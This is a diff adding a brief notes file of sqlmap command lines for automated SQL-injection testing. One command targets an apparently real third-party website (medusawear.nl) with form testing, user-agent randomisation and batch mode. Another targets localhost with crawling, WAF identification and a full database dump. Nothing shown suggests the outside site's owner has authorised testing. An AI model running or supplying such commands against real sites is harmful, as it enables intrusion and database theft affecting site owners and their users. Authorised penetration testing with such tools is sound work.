@@ -1,0 +1,9 @@
+python2 sqlmap.py -u http://www.medusawear.nl --forms --random-agent --batch --beep --ignore-401
+python2 sqlmap.py -u http://localhost:8888 --crawl=2 --forms --random-agent --ignore-401 --batch -o --beep --save=save-to-config --dump-all --dump-format=HTML --exclude-sysdbs --identify-waf --smart --mobile --output-dir=outputDIR
+
+--identify-waf
+--dbms
+--smart
+--mobile
+
+--exclude-sysdbs
